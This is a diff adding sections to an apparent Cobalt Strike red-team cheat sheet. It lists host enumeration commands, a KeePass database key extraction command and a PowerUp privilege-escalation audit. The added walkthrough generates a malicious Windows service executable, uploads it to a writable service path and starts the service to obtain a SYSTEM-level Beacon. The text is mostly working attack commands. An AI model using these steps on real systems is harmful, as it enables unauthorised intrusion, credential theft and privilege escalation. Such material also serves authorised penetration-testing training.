@@ -186,7 +186,7 @@ All commands and their output are written to the logs directory.
 ctrl+k will clear the current window.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Enumerate host
+# Enumeration
 
 Seatbelt					  Part of https://github.com/Flangvik/SharpCollection
 execute-assembly /opt/Seatbelt.exe -group=system
@@ -207,6 +207,9 @@ powershell Get-KeePassDatabaseKey
 Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
 help                                              New commands are added. There is no fork and run baggage.
                                                   Everything is executing in the context of Beacon.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Old school enumeration
 
 getuid                                            Get User ID
 ps                                                Show process list
@@ -259,6 +262,36 @@ psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell in
 
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
 powershell Invoke-PrivescAudit
+
+- Example output
+
+ServiceName   : VulnSvc
+Path          : C:\Temp\vuln.exe
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'VulnSvc'
+CanRestart    : Trun
+Name          : VulnSvc
+Check         : Modifiable Services
+
+We can exploit this misconfiguration by replacing the executable path with our own exe that will launch a Beacon.
+
+ls C:\Temp                                        Check to see if the exe exists.
+
+If not, we can just upload our malicous exe to that location without having to delete a file or modify service.
+
+Attacks > Packages > Windows Executable (S)
+Stage: select your stage
+Output: Windows Service EXE
+x64: check box
+Generate
+ 
+cd C:\Temp                                        Change to the target directory.
+upload /root/vuln.exe                             Upload malicious exe.
+ls                                                Verify the exe has uploaded.
+run sc start VulnSvc                              Start the service.
+
+You should now have a new Beacon.
+----------------------------------------------
 
 SharpUp is a C# port of PowerUp			  Part of https://github.com/Flangvik/SharpCollection
 Not all checks are ported.
